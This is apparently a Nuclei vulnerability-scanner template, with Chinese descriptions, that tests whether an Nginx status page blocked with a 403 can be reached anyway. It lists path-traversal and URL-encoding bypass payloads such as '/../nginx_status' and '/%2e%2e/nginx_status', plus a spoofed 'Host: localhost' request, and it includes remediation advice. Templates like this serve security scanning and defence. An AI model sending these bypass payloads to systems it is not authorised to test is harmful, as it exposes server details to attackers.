id: nginx-status-403-bypass

info:
  name: Nginx 状态页 403 Bypass
  author: pussycat0x
  severity: low
  description: |
    该模板用于核查 Nginx 状态页 403 Bypass。该类问题通常源于配置文件、备份文件、管理页面、服务状态或敏感资源被错误暴露到 Web 访问路径。模板会向目标发送探测请求，并依据请求 `/nginx_status`、`{{paths}}`、匹配 `status_code == 403`、匹配 `status_code == 200`、匹配 `contains(body, "Active connections:")`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可获取版本、路径、账号、密钥、令牌、配置或业务数据等敏感信息。
    - 泄露的信息可能被用于凭据攻击、漏洞匹配、权限提升或横向移动。
  remediation: |
    - 移除 Web 根目录下不应公开的配置、备份、日志和临时文件。
    - 为敏感页面和资源增加访问控制，并按最小暴露原则收敛公开路径。
    - 轮换已暴露的密钥、令牌和凭据，并审计异常下载或枚举行为。
  reference:
    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
  classification:
    cwe-id: CWE-22
  metadata:
    verified: true
    shodan-query: "server:nginx"
  tags: nginx,status,disclosure,bypass,misconfig

flow: http(1) && (http(2) || http (3))

http:
  - method: GET
    path:
      - "{{BaseURL}}/nginx_status"

    matchers:
      - type: dsl
        dsl:
          - "status_code == 403"
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}{{paths}}"

    attack: clusterbomb
    payloads:
      paths:
        - "/../nginx_status"
        - "/./nginx_status"
        - "/.//nginx_status"
        - "/./..;/nginx_status"
        - "/%2e%2e/nginx_status"
        - "/./%252e%252e/nginx_status"
        - "/./%6e%67%69%6e%78_%73%74%61%74%75%73"
        - "/;/nginx_status"
        - "/./?/nginx_status"
        - "/./nginx_status;"
        - "/./nginx_status%20"
        - "/./nginx_status/"

    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Active connections:")'
        condition: and

  - raw:
      - |
        @Host: localhost
        GET /nginx_status HTTP/1.1
        Host: localhost

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Active connections:")'
        condition: and
